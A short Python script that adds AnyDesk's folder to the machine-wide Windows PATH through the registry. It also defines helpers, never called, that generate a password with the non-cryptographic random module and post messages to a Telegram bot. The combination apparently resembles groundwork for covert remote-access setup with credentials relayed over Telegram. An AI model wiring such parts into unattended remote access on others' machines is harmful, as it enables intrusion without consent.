import string
import random
import requests
import winreg as reg


def generate_password(length=12):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
    }
    response = requests.post(url, params=data)
    return response.json()


def add_to_system_path(directory):
    key = reg.OpenKey(
        reg.HKEY_LOCAL_MACHINE,
        r'SYSTEM\CurrentControlSet\Control\Session Manager\Environment',
        0,
        reg.KEY_ALL_ACCESS
    )

    try:
        current_path = reg.QueryValueEx(key, 'Path')[0]

        if str(directory) not in current_path:
            new_path = current_path + ";" + str(directory)
            reg.SetValueEx(key, 'Path', 0, reg.REG_EXPAND_SZ, new_path)
            print(f"Added {directory} to system PATH.")
        else:
            print(f"{directory} is already in the system PATH.")
    finally:
        reg.CloseKey(key)


if __name__ == "__main__":
    add_to_system_path("C:\\Program Files (x86)\\AnyDesk\\")
